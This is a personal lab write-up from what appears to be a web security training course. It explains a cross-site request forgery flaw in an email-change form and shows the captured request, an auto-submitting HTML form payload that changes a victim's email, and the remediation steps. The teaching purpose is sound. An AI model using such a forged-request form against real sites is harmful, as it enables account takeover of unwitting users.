# Lab 01 - CSRF Vulnerability With No Defences

Topic: State-changing request protected only by a session cookie  
Focus: identifying a missing CSRF token and reproducing the request from an external page

## Goal

Use a CSRF attack in a legal lab environment to change the victim's email address.

## Input I Controlled

The controlled input was the `email` parameter in the request body.

The attacker also controlled the external HTML form hosted on the exploit server.

## What Happened

I captured the email change request:

```http
POST /my-account/change-email
Content-Type: application/x-www-form-urlencoded
Cookie: session=...

email=wiener%40normal-user.net
```

The request changed the user's email address and did not include a CSRF token.

I created an external HTML form that submitted the same request automatically:

```html
<form method="POST" action="https://LAB-HOST/my-account/change-email">
  <input type="hidden" name="email" value="test123@example.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

After storing the payload on the exploit server and delivering it to the victim, the lab was solved. I had to use a new unique email value because previously used values could prevent the lab from completing.

## What I Learned

`POST` does not prevent CSRF. A malicious site can create and auto-submit a form.

The server accepted the request because the browser supplied the victim's session cookie automatically. The application had no token or additional verification to prove user intent.

## Impact

In a real application, an attacker could change a victim's email address. Depending on the application, this could support account takeover flows, password reset abuse, or unwanted account changes.

## Remediation Summary

See `../overview.md` for the general remediation section.

Specific to this lab:

- add a strong CSRF token to the email change form,
- bind the token to the user's session,
- validate the token server-side,
- reject requests with missing or invalid tokens,
- use SameSite cookies as an additional defence-in-depth layer.

## Main Takeaway

A session cookie proves that the browser is authenticated. It does not prove that the user intentionally submitted the request.
